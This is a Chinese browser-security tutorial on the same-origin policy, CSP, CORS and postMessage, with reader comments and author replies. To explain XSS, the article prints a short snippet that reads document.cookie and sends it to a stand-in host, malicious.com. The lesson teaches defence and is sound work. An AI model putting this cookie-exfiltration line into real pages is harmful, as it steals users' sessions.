{"id":151370,"title":"32 | 同源策略：为什么XMLHttpRequest不能跨域请求资源？","content":"<p>通过前面6个模块的介绍，我们已经大致知道浏览器是怎么工作的了，也了解这种工作方式对前端产生了什么样的影响。在这个过程中，我们还穿插介绍了一些浏览器安全相关的内容，不过都比较散，所以最后的5篇文章，我们就来系统地介绍下浏览器安全相关的内容。</p><p>浏览器安全可以分为三大块——<strong>Web页面安全、浏览器网络安全</strong>和<strong>浏览器系统安全</strong>，所以本模块我们就按照这个思路来做介绍。鉴于页面安全的重要性，我们会用三篇文章来介绍该部分的知识；网络安全和系统安全则分别用一篇来介绍。</p><p>今天我们就先来分析页面中的安全策略，不过在开始之前，我们先来做个假设，如果页面中没有安全策略的话，Web世界会是什么样子的呢？</p><p>Web世界会是开放的，任何资源都可以接入其中，我们的网站可以加载并执行别人网站的脚本文件、图片、音频/视频等资源，甚至可以下载其他站点的可执行文件。</p><p>Web世界是开放的，这很符合Web理念。但如果Web世界是绝对自由的，那么页面行为将没有任何限制，这会造成无序或者混沌的局面，出现很多不可控的问题。</p><p>比如你打开了一个银行站点，然后又一不小心打开了一个恶意站点，如果没有安全措施，恶意站点就可以做很多事情：</p><ul>\n<li>修改银行站点的DOM、CSSOM等信息；</li>\n<li>在银行站点内部插入JavaScript脚本；</li>\n<li>劫持用户登录的用户名和密码；</li>\n<li>读取银行站点的Cookie、IndexDB等数据；</li>\n<li>甚至还可以将这些信息上传至自己的服务器，这样就可以在你不知情的情况下伪造一些转账请求等信息。</li>\n</ul><!-- [[[read_end]]] --><p>所以说，<strong>在没有安全保障的Web世界中，我们是没有隐私的，因此需要安全策略来保障我们的隐私和数据的安全</strong>。</p><p>这就引出了页面中最基础、最核心的安全策略：<strong>同源策略（Same-origin policy）</strong>。</p><h2>什么是同源策略</h2><p>要了解什么是同源策略，我们得先来看看什么是同源。</p><p><strong>如果两个URL的协议、域名和端口都相同，我们就称这两个URL同源</strong>。比如下面这两个URL，它们具有相同的协议HTTPS、相同的域名time.geekbang.org，以及相同的端口443，所以我们就说这两个URL是同源的。</p><pre><code>https://time.geekbang.org/?category=1\nhttps://time.geekbang.org/?category=0\n</code></pre><p>浏览器默认两个相同的源之间是可以相互访问资源和操作DOM的。两个不同的源之间若想要相互访问资源或者操作DOM，那么会有一套基础的安全策略的制约，我们把这称为同源策略。</p><p>具体来讲，同源策略主要表现在DOM、Web数据和网络这三个层面。</p><p><strong>第一个，DOM层面</strong>。同源策略限制了来自不同源的JavaScript脚本对当前DOM对象读和写的操作。</p><p>这里我们还是拿极客时间的官网做例子，打开极客时间的官网，然后再从官网中打开另外一个专栏页面，如下图所示：</p><p><img src=\"https://static001.geekbang.org/resource/image/c9/d7/c9294ee10c571c8b7061a5c8f03b6cd7.png?wh=1142*526\" alt=\"\"></p><center><span class=\"reference\">通过极客时间官网打开一个专栏页面</span></center><p>由于第一个页面和第二个页面是同源关系，所以我们可以在第二个页面中操作第一个页面的DOM，比如将第一个页面全部隐藏掉，代码如下所示：</p><pre><code>{\nlet pdom = opener.document\npdom.body.style.display = &quot;none&quot;\n}\n</code></pre><p>该代码中，对象opener就是指向第一个页面的window对象，我们可以通过操作opener来控制第一个页面中的DOM。</p><p>我们在第二个页面的控制台中执行上面那段代码，就成功地操作了第一个页面中的DOM，将页面隐藏了，如下图：</p><p><img src=\"https://static001.geekbang.org/resource/image/2a/25/2a988d3d2f82aa4230f2b5025134b125.png?wh=1142*528\" alt=\"\"></p><center><span class=\"reference\">通过第二个页面操纵第一个页面的DOM</span></center><p>不过如果打开的第二个页面和第一个页面不是同源的，那么它们就无法相互操作DOM了。比如从极客时间官网打开InfoQ的页面（由于它们的域名不同，所以不是同源的），然后我们还按照前面同样的步骤来操作，最终操作结果如下图所示：</p><p><img src=\"https://static001.geekbang.org/resource/image/71/b5/711d96a58f670bda0d9b9608165839b5.png?wh=1142*539\" alt=\"\"></p><center><span class=\"reference\">不同源的两个页面不能相互操纵DOM</span></center><p>从图中可以看出，当我们在InfoQ的页面中访问极客时间页面中的DOM时，页面抛出了如下的异常信息，这就是同源策略所发挥的作用。</p><pre><code>Blocked a frame with origin &quot;https://www.infoq.cn&quot; from accessing a cross-origin frame.\n</code></pre><p><strong>第二个，数据层面</strong>。同源策略限制了不同源的站点读取当前站点的Cookie、IndexDB、LocalStorage等数据。由于同源策略，我们依然无法通过第二个页面的opener来访问第一个页面中的Cookie、IndexDB或者LocalStorage等内容。你可以自己试一下，这里我们就不做演示了。</p><p><strong>第三个，网络层面</strong>。同源策略限制了通过XMLHttpRequest等方式将站点的数据发送给不同源的站点。你还记得在<a href=\"https://time.geekbang.org/column/article/135127\">《17 | WebAPI：XMLHttpRequest是怎么实现的？》</a>这篇文章的末尾分析的XMLHttpRequest在使用过程中所遇到的坑吗？其中第一个坑就是在默认情况下不能访问跨域的资源。</p><h2>安全和便利性的权衡</h2><p>我们了解了同源策略会隔离不同源的DOM、页面数据和网络通信，进而实现Web页面的安全性。</p><p>不过安全性和便利性是相互对立的，让不同的源之间绝对隔离，无疑是最安全的措施，但这也会使得Web项目难以开发和使用。因此我们就要在这之间做出权衡，出让一些安全性来满足灵活性；而出让安全性又带来了很多安全问题，最典型的是XSS攻击和CSRF攻击，这两种攻击我们会在后续两篇文章中再做介绍，本文我们只聊浏览器出让了同源策略的哪些安全性。</p><h3>1. 页面中可以嵌入第三方资源</h3><p>我们在文章开头提到过，Web世界是开放的，可以接入任何资源，而同源策略要让一个页面的所有资源都来自于同一个源，也就是要将该页面的所有HTML文件、JavaScript文件、CSS文件、图片等资源都部署在同一台服务器上，这无疑违背了Web的初衷，也带来了诸多限制。比如将不同的资源部署到不同的CDN上时，CDN上的资源就部署在另外一个域名上，因此我们就需要同源策略对页面的引用资源开一个“口子”，让其任意引用外部文件。</p><p>所以最初的浏览器都是支持外部引用资源文件的，不过这也带来了很多问题。之前在开发浏览器的时候，遇到最多的一个问题是浏览器的首页内容会被一些恶意程序劫持，劫持的途径很多，其中最常见的是恶意程序通过各种途径往HTML文件中插入恶意脚本。</p><p>比如，恶意程序在HTML文件内容中插入如下一段JavaScript代码：</p><p><img src=\"https://static001.geekbang.org/resource/image/74/de/741dc2c53217aee177d18375a7aa94de.png?wh=834*338\" alt=\"\"></p><p>当这段HTML文件的数据被送达浏览器时，浏览器是无法区分被插入的文件是恶意的还是正常的，这样恶意脚本就寄生在页面之中，当页面启动时，它可以修改用户的搜索结果、改变一些内容的连接指向，等等。</p><p>除此之外，它还能将页面的的敏感数据，如Cookie、IndexDB、LoacalStorage等数据通过XSS的手段发送给服务器。具体来讲就是，当你不小心点击了页面中的一个恶意链接时，恶意JavaScript代码可以读取页面数据并将其发送给服务器，如下面这段伪代码：</p><pre><code>function onClick(){\n  let url = `http://malicious.com?cookie = ${document.cookie}`\n  open(url)\n}\nonClick()\n</code></pre><p>在这段代码中，恶意脚本读取Cookie数据，并将其作为参数添加至恶意站点尾部，当打开该恶意页面时，恶意服务器就能接收到当前用户的Cookie信息。</p><p>以上就是一个非常典型的XSS攻击。为了解决XSS攻击，浏览器中引入了内容安全策略，称为CSP。<strong>CSP的核心思想是让服务器决定浏览器能够加载哪些资源，让服务器决定浏览器是否能够执行内联JavaScript代码</strong>。通过这些手段就可以大大减少XSS攻击。</p><h3>2. 跨域资源共享和跨文档消息机制</h3><p>默认情况下，如果打开极客邦的官网页面，在官网页面中通过XMLHttpRequest或者Fetch来请求InfoQ中的资源，这时同源策略会阻止其向InfoQ发出请求，这样会大大制约我们的生产力。</p><p>为了解决这个问题，我们引入了<strong>跨域资源共享（CORS）</strong>，使用该机制可以进行跨域访问控制，从而使跨域数据传输得以安全进行。</p><p>在介绍同源策略时，我们说明了如果两个页面不是同源的，则无法相互操纵DOM。不过在实际应用中，经常需要两个不同源的DOM之间进行通信，于是浏览器中又引入了<strong>跨文档消息机制</strong>，可以通过window.postMessage的JavaScript接口来和不同源的DOM进行通信。</p><h2>总结</h2><p>好了，今天就介绍到这里，下面我来总结下本文的主要内容。</p><p>同源策略会隔离不同源的DOM、页面数据和网络通信，进而实现Web页面的安全性。</p><p>不过鱼和熊掌不可兼得，要绝对的安全就要牺牲掉便利性，因此我们要在这二者之间做权衡，找到中间的一个平衡点，也就是目前的页面安全策略原型。总结起来，它具备以下三个特点：</p><ol>\n<li>页面中可以引用第三方资源，不过这也暴露了很多诸如XSS的安全问题，因此又在这种开放的基础之上引入了CSP来限制其自由程度。</li>\n<li>使用XMLHttpRequest和Fetch都是无法直接进行跨域请求的，因此浏览器又在这种严格策略的基础之上引入了跨域资源共享策略，让其可以安全地进行跨域操作。</li>\n<li>两个不同源的DOM是不能相互操纵的，因此，浏览器中又实现了跨文档消息机制，让其可以比较安全地通信。</li>\n</ol><h2>思考时间</h2><p>今天留给你的作业：你来总结一下同源策略、CSP和CORS之间的关系，这对于你理解浏览器的安全策略至关重要。</p><p>欢迎在留言区与我分享你的想法，也欢迎你在留言区记录你的思考过程。感谢阅读，如果你觉得这篇文章对你有帮助的话，也欢迎把它分享给更多的朋友。</p><p></p>","comments":[{"had_liked":false,"id":144626,"user_name":"歌顿","can_delete":false,"product_type":"c1","uid":1154982,"ip_address":"","ucode":"EA84E55C61F61A","user_header":"http://thirdwx.qlogo.cn/mmopen/vi_32/Q0j4TwGTfTIVA6yj0YzARUJV3uqD5Qu0OUNbypl5QvCEwx0rTXubaXlU9TPoorQaZT8SMMvXZMnHLjIpBvIsnA/132","comment_is_top":false,"comment_ctime":1571984878,"is_pvip":true,"replies":[{"id":"56714","content":"总结的很好","user_name":"作者回复","user_name_real":"李兵","uid":"1141464","ctime":1572618404,"ip_address":"","comment_id":144626,"utype":1}],"discussion_count":2,"race_medal":0,"score":"413888845294","product_id":100033601,"comment_content":"同源策略、CSP 和 CORS 之间的关系：<br><br>同源策略就是说同源页面随你瞎搞，但是不同源之间想瞎搞只能通过浏览器提供的手段来搞<br><br>比如说 <br>1. 读取数据和操作 DOM 要用跨文档机制 <br>2. 跨域请求要用 CORS 机制<br>3.  引用第三方资源要用 CSP","like_count":96,"discussions":[{"author":{"id":1141464,"avatar":"https://static001.geekbang.org/account/avatar/00/11/6a/d8/228449c9.jpg","nickname":"李兵","note":"","ucode":"3F3D3F6E20209E","race_medal":0,"user_type":2,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":472039,"discussion_content":"总结的很好","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1572618404,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":true,"parent_id":0,"ip_address":""},"score":2,"extra":"{\"reply\":true,\"user_type\":2}","child_discussion_number":0,"child_discussions":[]},{"author":{"id":1673843,"avatar":"http://thirdwx.qlogo.cn/mmopen/vi_32/DYAIOgq83erXRaa98A3zjLDkOibUJV1254aQ4EYFTbSLJuEvD0nXicMNA8pLoxOfHf5kPTbGLXNicg8CPFH3Tn0mA/132","nickname":"Geek_115bc8","note":"","ucode":"71FBC9F02AFE1B","race_medal":0,"user_type":1,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":569355,"discussion_content":"老哥，浏览器中不是可以随意使用第三方资源吗。为了解决安全问题，引入了csp来限制那些资源可以生效吗？","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1651412955,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":false,"parent_id":0,"ip_address":""},"score":2,"extra":"","child_discussion_number":0,"child_discussions":[]}]},{"had_liked":false,"id":142413,"user_name":"Angus","can_delete":false,"product_type":"c1","uid":1377467,"ip_address":"","ucode":"7CC3BA1550FB5B","user_header":"https://static001.geekbang.org/account/avatar/00/15/04/bb/5e5c37c1.jpg","comment_is_top":false,"comment_ctime":1571364534,"is_pvip":false,"replies":[{"id":"54943","content":"<br>是的，有几个原因：<br><br>第一、每篇文章有death line的，越到后面时间越赶，所以完成每篇文章的时间就越来越紧凑了。<br><br>第二、浏览器这块要讲的东西比较多，有架构，JavaScript，页面，网络和安全，还有一些H5的内容。  <br>所以当初在定目录的时候，主干36篇课程主要讲主线内容，要照顾广度，所以有些细节不能深入太多。比如提到CSP和CORS在主干课程中没办法讲的太细。<br><br>当然，这些原因并不是不把内容讲透的借口，接下来，我把会把很多深度内容放到加餐和答疑部分：<br>比如有老铁问事件循环中采用while会不会造成页面卡死的问题？这里我到时会补充介绍系统事件驱动机制，还会结合事件循环机制来介绍Performance。<br><br>还有很多老铁问到UI线程，所以这块我还要结合浏览器进程和网络进程来补充相关知识！<br><br>稍晚点就要着手准备加餐内容大纲了。<br>","user_name":"作者回复","user_name_real":"李兵","uid":"1141464","ctime":1571373818,"ip_address":"","comment_id":142413,"utype":1}],"discussion_count":2,"race_medal":0,"score":"250679467702","product_id":100033601,"comment_content":"看这篇幅，专栏应该会在浏览器安全中结束。从二十五讲开始就觉得越来越浅显了，前面好几篇说的后面章节再详细讲解的部分好像并没有出现。","like_count":58,"discussions":[{"author":{"id":1708271,"avatar":"https://static001.geekbang.org/account/avatar/00/1a/10/ef/4c9b2383.jpg","nickname":"Everlaa","note":"","ucode":"9B4FFFABD62B07","race_medal":0,"user_type":1,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":289275,"discussion_content":"越来越水。。。。。","likes_number":2,"is_delete":false,"is_hidden":false,"ctime":1594044790,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":false,"parent_id":0,"ip_address":""},"score":2,"extra":"","child_discussion_number":0,"child_discussions":[]},{"author":{"id":1141464,"avatar":"https://static001.geekbang.org/account/avatar/00/11/6a/d8/228449c9.jpg","nickname":"李兵","note":"","ucode":"3F3D3F6E20209E","race_medal":0,"user_type":2,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":471114,"discussion_content":"\n是的，有几个原因：\n\n第一、每篇文章有death line的，越到后面时间越赶，所以完成每篇文章的时间就越来越紧凑了。\n\n第二、浏览器这块要讲的东西比较多，有架构，JavaScript，页面，网络和安全，还有一些H5的内容。  \n所以当初在定目录的时候，主干36篇课程主要讲主线内容，要照顾广度，所以有些细节不能深入太多。比如提到CSP和CORS在主干课程中没办法讲的太细。\n\n当然，这些原因并不是不把内容讲透的借口，接下来，我把会把很多深度内容放到加餐和答疑部分：\n比如有老铁问事件循环中采用while会不会造成页面卡死的问题？这里我到时会补充介绍系统事件驱动机制，还会结合事件循环机制来介绍Performance。\n\n还有很多老铁问到UI线程，所以这块我还要结合浏览器进程和网络进程来补充相关知识！\n\n稍晚点就要着手准备加餐内容大纲了。\n","likes_number":1,"is_delete":false,"is_hidden":false,"ctime":1571373818,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":true,"parent_id":0,"ip_address":""},"score":2,"extra":"{\"reply\":true,\"user_type\":2}","child_discussion_number":0,"child_discussions":[]}]},{"had_liked":false,"id":142043,"user_name":"磐","can_delete":false,"product_type":"c1","uid":1219451,"ip_address":"","ucode":"76F64A31613A09","user_header":"https://static001.geekbang.org/account/avatar/00/12/9b/7b/7f450dd4.jpg","comment_is_top":false,"comment_ctime":1571282636,"is_pvip":false,"replies":[{"id":"54826","content":"的确，篇幅有限，讲太细了广度照顾不到！<br><br>我先还是搭建整体的体系框架，涉及到细节内容我们答疑来补！<br><br>感觉我是在给自己挖个大坑，要补的内容感觉都能出一个小专栏了","user_name":"作者回复","user_name_real":"李兵","uid":"1141464","ctime":1571288710,"ip_address":"","comment_id":142043,"utype":1}],"discussion_count":1,"race_medal":0,"score":"151895137996","product_id":100033601,"comment_content":"希望老师能详细的讲解，最近几讲，感觉讲的太浅显了，都是些概念性的东西","like_count":35,"discussions":[{"author":{"id":1141464,"avatar":"https://static001.geekbang.org/account/avatar/00/11/6a/d8/228449c9.jpg","nickname":"李兵","note":"","ucode":"3F3D3F6E20209E","race_medal":0,"user_type":2,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":470964,"discussion_content":"的确，篇幅有限，讲太细了广度照顾不到！\n\n我先还是搭建整体的体系框架，涉及到细节内容我们答疑来补！\n\n感觉我是在给自己挖个大坑，要补的内容感觉都能出一个小专栏了","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1571288710,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":true,"parent_id":0,"ip_address":""},"score":2,"extra":"{\"reply\":true,\"user_type\":2}","child_discussion_number":0,"child_discussions":[]}]},{"had_liked":false,"id":152915,"user_name":"空山鸟语","can_delete":false,"product_type":"c1","uid":1375838,"ip_address":"","ucode":"BA9993D7A4DC80","user_header":"https://static001.geekbang.org/account/avatar/00/14/fe/5e/9b723d19.jpg","comment_is_top":false,"comment_ctime":1574123831,"is_pvip":false,"replies":[{"id":"58786","content":"关于浏览器的介绍网上资料好的的确不多，写这个专栏的时候也查阅了很多网上的资料，但是总体上质量都不怎么行，而且有些作者的理解也不正确错误！<br><br>另外网上的资料也谁零碎、不成体系的！<br><br>如果自己去啃源码会花费很大精力！<br><br>所以极客时间的gray找到我的时候，我觉得来做浏览器专栏很有必要，因为浏览器应用已经非常广的，而市面上体系化介绍浏览器的书籍或者文章少之又少！<br><br><br>如果你想深入了解，这里我推荐去看一些官方举办会议的视频，比如油管上的blink on！另外还有源码里面的文档，不过啃着快的难度有点大！","user_name":"作者回复","user_name_real":"李兵","uid":"1141464","ctime":1574140466,"ip_address":"","comment_id":152915,"utype":1}],"discussion_count":3,"race_medal":0,"score":"44523796791","product_id":100033601,"comment_content":"老师总结的非常好，具体的细节我们可以自己查资料。<br>但是在我们学习过程中发现，现在网上文章质量参差不齐，想找到一篇好文章很不容易。比如某金，文章多而杂，往往是看完了感觉没什么收获，也消耗了耐心和精力。<br>针对这种情况，我们该怎么半呢？","like_count":10,"discussions":[{"author":{"id":1141464,"avatar":"https://static001.geekbang.org/account/avatar/00/11/6a/d8/228449c9.jpg","nickname":"李兵","note":"","ucode":"3F3D3F6E20209E","race_medal":0,"user_type":2,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":474989,"discussion_content":"关于浏览器的介绍网上资料好的的确不多，写这个专栏的时候也查阅了很多网上的资料，但是总体上质量都不怎么行，而且有些作者的理解也不正确错误！\n\n另外网上的资料也谁零碎、不成体系的！\n\n如果自己去啃源码会花费很大精力！\n\n所以极客时间的gray找到我的时候，我觉得来做浏览器专栏很有必要，因为浏览器应用已经非常广的，而市面上体系化介绍浏览器的书籍或者文章少之又少！\n\n\n如果你想深入了解，这里我推荐去看一些官方举办会议的视频，比如油管上的blink on！另外还有源码里面的文档，不过啃着快的难度有点大！","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1574140466,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":true,"parent_id":0,"ip_address":""},"score":2,"extra":"{\"reply\":true,\"user_type\":2}","child_discussion_number":0,"child_discussions":[]},{"author":{"id":1266698,"avatar":"https://static001.geekbang.org/account/avatar/00/13/54/0a/9a002ad5.jpg","nickname":"Adam Lau","note":"","ucode":"7E542D6E789500","race_medal":0,"user_type":1,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":364878,"discussion_content":"某金是指哪里？","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1617634100,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":false,"parent_id":0,"ip_address":""},"score":2,"extra":"","child_discussion_number":1,"child_discussions":[{"author":{"id":2060631,"avatar":"","nickname":"无昵称","note":"","ucode":"85AB3730CA6B10","race_medal":0,"user_type":1,"is_pvip":false},"reply_author":{"id":1266698,"avatar":"https://static001.geekbang.org/account/avatar/00/13/54/0a/9a002ad5.jpg","nickname":"Adam Lau","note":"","ucode":"7E542D6E789500","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":370290,"discussion_content":"掘金","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1619357058,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":false,"parent_id":364878,"ip_address":""},"score":370290,"extra":""}]}]},{"had_liked":false,"id":264259,"user_name":"Demo_12","can_delete":false,"product_type":"c1","uid":2125587,"ip_address":"","ucode":"D99A09198B0710","user_header":"https://static001.geekbang.org/account/avatar/00/20/6f/13/19bec416.jpg","comment_is_top":false,"comment_ctime":1606393371,"is_pvip":false,"discussion_count":0,"race_medal":0,"score":"35966131739","product_id":100033601,"comment_content":"同源策略是为了解决网络安全的问题，限制只能在同源的站点内操作DOM、本地数据、网络请求<br>而CSP 和 CORS是解决因同源策略限制而损失的灵活性和便利性<br>CSP，通过设置 Content-Security-Policy 来决定你的浏览器可以执行哪里的脚本，可以解决XSS攻击的问题<br>CORS，可以通过HTTP请求来共享不同源的数据<br>postMessage, 支持跨文档读取数据和操作 DOM","like_count":8},{"had_liked":false,"id":142042,"user_name":"coolseaman","can_delete":false,"product_type":"c1","uid":1213148,"ip_address":"","ucode":"D2569CD01853B6","user_header":"https://static001.geekbang.org/account/avatar/00/12/82/dc/5dbbe598.jpg","comment_is_top":false,"comment_ctime":1571282491,"is_pvip":false,"discussion_count":1,"race_medal":0,"score":"23046118971","product_id":100033601,"comment_content":"【同源策略】是Web在DOM、Web 数据和网络三个层面上提供的安全策略，保证我们在Web使用中的隐私和数据安全。但是过于严格的安全策略，损失了Web开发和使用中的灵活性，所以我们必须出让一部分安全性，以便达到安全和灵活的平衡。<br>Web在出让安全性方面主要是允许嵌入第三方资源、跨域资源共享。<br>为解决允许嵌入第三方资源的风险，最典型的就是XSS攻击，浏览器引入了内容安全策略，即【CSP】，由服务端来决定可以加载哪些第三方资源。<br>在Web页面中我们经常需要通过XMLHttpRequest或ajax发送跨域请求，而【同源策略】会阻止我们的请求，为了解决这个问题，引入了跨域资源共享【CORS】。","like_count":5,"discussions":[{"author":{"id":2575992,"avatar":"https://static001.geekbang.org/account/avatar/00/27/4e/78/1b1bc18e.jpg","nickname":"光穿过森林","note":"","ucode":"446ED739536427","race_medal":0,"user_type":1,"is_pvip":true},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":571684,"discussion_content":"我在网上看到同源策略不会阻止跨域ajax请求，但是请求无法携带cookie，并且浏览器会拦截响应信息","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1652345682,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":false,"parent_id":0,"ip_address":""},"score":2,"extra":"","child_discussion_number":0,"child_discussions":[]}]},{"had_liked":false,"id":162566,"user_name":"-_-|||","can_delete":false,"product_type":"c1","uid":1328142,"ip_address":"","ucode":"94B21594658BF9","user_header":"https://static001.geekbang.org/account/avatar/00/14/44/0e/ce14b7d3.jpg","comment_is_top":false,"comment_ctime":1576555971,"is_pvip":false,"discussion_count":4,"race_medal":1,"score":"18756425155","product_id":100033601,"comment_content":"“CSP 的核心思想是让服务器决定浏览器能够加载哪些资源，让服务器决定浏览器是否能够执行内联 JavaScript 代码。”服务器怎么决定“浏览器是否能够执行内联 JavaScript 代码”？难道服务器还能监听浏览器执行的代码？","like_count":4,"discussions":[{"author":{"id":1201350,"avatar":"https://static001.geekbang.org/account/avatar/00/12/54/c6/c2481790.jpg","nickname":"lisiur","note":"","ucode":"CEB2DBCE29CAA7","race_medal":0,"user_type":1,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":245860,"discussion_content":"这是种浏览器需要遵守的规范，服务端设置，浏览器根据规则执行","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1587705603,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":false,"parent_id":0,"ip_address":""},"score":2,"extra":"","child_discussion_number":2,"child_discussions":[{"author":{"id":1313840,"avatar":"https://static001.geekbang.org/account/avatar/00/14/0c/30/bb4bfe9d.jpg","nickname":"lyonger","note":"","ucode":"E89A75DADEA2A1","race_medal":0,"user_type":1,"is_pvip":false},"reply_author":{"id":1201350,"avatar":"https://static001.geekbang.org/account/avatar/00/12/54/c6/c2481790.jpg","nickname":"lisiur","note":"","ucode":"CEB2DBCE29CAA7","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":332966,"discussion_content":"没太明白，可否麻烦大佬举个例子？","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1607404278,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":false,"parent_id":245860,"ip_address":""},"score":332966,"extra":""},{"author":{"id":1963947,"avatar":"http://thirdwx.qlogo.cn/mmopen/vi_32/0iaIWczXBpgnVVQwKmKNg62rMUDhMyuZOD9BMzbcfg37zu5NFMAAm79FTwsiblmMHfSu0ew6BHWRTyaCR7s8vbtw/132","nickname":"Geek_392d92","note":"","ucode":"73F65CC90BE036","race_medal":0,"user_type":1,"is_pvip":false},"reply_author":{"id":1313840,"avatar":"https://static001.geekbang.org/account/avatar/00/14/0c/30/bb4bfe9d.jpg","nickname":"lyonger","note":"","ucode":"E89A75DADEA2A1","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":356777,"discussion_content":"就比如服务器设置响应头缓存相关。浏览器下次请求前就会走强缓存协商缓存这种机制。浏览器内部根据服务器响应的header做出相应的反应","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1615674461,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":false,"parent_id":332966,"ip_address":""},"score":356777,"extra":""}]},{"author":{"id":1008475,"avatar":"https://static001.geekbang.org/account/avatar/00/0f/63/5b/a23a82a4.jpg","nickname":"大雄不爱吃肉","note":"","ucode":"EFC131ECA99CA8","race_medal":0,"user_type":1,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":205847,"discussion_content":"服务端设置csp的响应头，那么html页面内的安全策略就定了","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1584350140,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":false,"parent_id":0,"ip_address":""},"score":2,"extra":"","child_discussion_number":0,"child_discussions":[]}]},{"had_liked":false,"id":153063,"user_name":"Geek_259055","can_delete":false,"product_type":"c1","uid":1377689,"ip_address":"","ucode":"9C02A4DAF2D089","user_header":"http://thirdwx.qlogo.cn/mmopen/vi_32/D5lTKlxYlRfWBl8ye0JvdfmVo0Ykibt7QhDf1A3g8L66lL36xFkHKUIicCia8dz2Y2mU5qG1OJLdfOvQSoD6svib2Q/132","comment_is_top":false,"comment_ctime":1574151078,"is_pvip":false,"replies":[{"id":"59303","content":"感谢提供资源","user_name":"作者回复","user_name_real":"李兵","uid":"1141464","ctime":1574481385,"ip_address":"","comment_id":153063,"utype":1}],"discussion_count":1,"race_medal":0,"score":"18754020262","product_id":100033601,"comment_content":"想详细了解CORS,可以看阮一峰的这篇文章https:&#47;&#47;www.ruanyifeng.com&#47;blog&#47;2016&#47;04&#47;cors.html","like_count":4,"discussions":[{"author":{"id":1141464,"avatar":"https://static001.geekbang.org/account/avatar/00/11/6a/d8/228449c9.jpg","nickname":"李兵","note":"","ucode":"3F3D3F6E20209E","race_medal":0,"user_type":2,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":475031,"discussion_content":"感谢提供资源","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1574481385,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":true,"parent_id":0,"ip_address":""},"score":2,"extra":"{\"reply\":true,\"user_type\":2}","child_discussion_number":0,"child_discussions":[]}]},{"had_liked":false,"id":296476,"user_name":"张宗伟","can_delete":false,"product_type":"c1","uid":1374181,"ip_address":"","ucode":"1447A20C7A8982","user_header":"https://static001.geekbang.org/account/avatar/00/14/f7/e5/ec543f3b.jpg","comment_is_top":false,"comment_ctime":1622992203,"is_pvip":false,"discussion_count":0,"race_medal":0,"score":"5917959499","product_id":100033601,"comment_content":"同源策略是浏览器限制不同源的web页面之间的相互操作，以此来保证安全性。<br>但是却极大地降低了便利性，所以浏览器会放开一些限制，但是也规定了一些新策略，例如 CSP、CORS 等来尽可能地维护web页面安全性。","like_count":1},{"had_liked":false,"id":280884,"user_name":"惊沙男孩","can_delete":false,"product_type":"c1","uid":1562840,"ip_address":"","ucode":"A7160E90983730","user_header":"http://thirdwx.qlogo.cn/mmopen/vi_32/Q0j4TwGTfTL1AlMfMbIJccY2t3kLgyk6LLfConLPZx7uiaVBMrQdib0IKu6A9jic1w1jDAdxMoEqCWH78mpp3qN6Q/132","comment_is_top":false,"comment_ctime":1614438061,"is_pvip":false,"discussion_count":0,"race_medal":0,"score":"5909405357","product_id":100033601,"comment_content":"同源策略是浏览器方面大局的策略，其中CSP和CORS是在这种大策略下的设置的阀门，保证一定便利性的同时确保安全","like_count":1},{"had_liked":false,"id":273849,"user_name":"独白","can_delete":false,"product_type":"c1","uid":1700211,"ip_address":"","ucode":"EDC477BD20B032","user_header":"https://static001.geekbang.org/account/avatar/00/19/f1/73/6f7e3b35.jpg","comment_is_top":false,"comment_ctime":1610696369,"is_pvip":false,"discussion_count":0,"race_medal":0,"score":"5905663665","product_id":100033601,"comment_content":"csp：加载不同源的文件时需要用到的控制工具<br>cors：请求不同源接口时需要用到的控制工具<br>跨文档消息机制：不同页面之间通信的控制